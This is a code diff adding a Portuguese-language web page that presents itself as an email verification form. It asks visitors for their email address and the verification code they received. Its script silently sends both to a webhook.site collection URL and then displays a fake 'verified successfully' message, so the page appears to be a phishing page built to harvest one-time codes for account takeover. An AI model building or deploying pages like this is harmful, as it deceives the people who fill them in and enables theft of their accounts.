@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificação de E-mail</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+    input[type="email"], input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      background-color: #000;
+      color: #fff;
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      width: 100%;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .success {
+      margin-top: 15px;
+      color: green;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Verifique seu E-mail</h2>
+    <p>Insira seu e-mail e o código enviado para validação.</p>
+    <input type="email" id="email" placeholder="Seu e-mail" required>
+    <input type="text" id="codigo" placeholder="Código de verificação" required>
+    <button onclick="enviarDados()">Verificar</button>
+    <p class="success" id="mensagemSucesso">Verificado com sucesso!</p>
+  </div>
+
+  <script>
+    function enviarDados() {
+      const email = document.getElementById('email').value;
+      const codigo = document.getElementById('codigo').value;
+
+      const url = 'https://webhook.site/a0cb9279-32e2-484f-a7e0-5c560d046475'; 
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ email: email, codigo: codigo })
+      })
+      .then(response => {
+        document.getElementById('mensagemSucesso').style.display = 'block';
+      })
+      .catch(error => {
+        alert('Erro ao enviar. Tente novamente.');
+      });
+    }
+  </script>
+</body>
+</html>
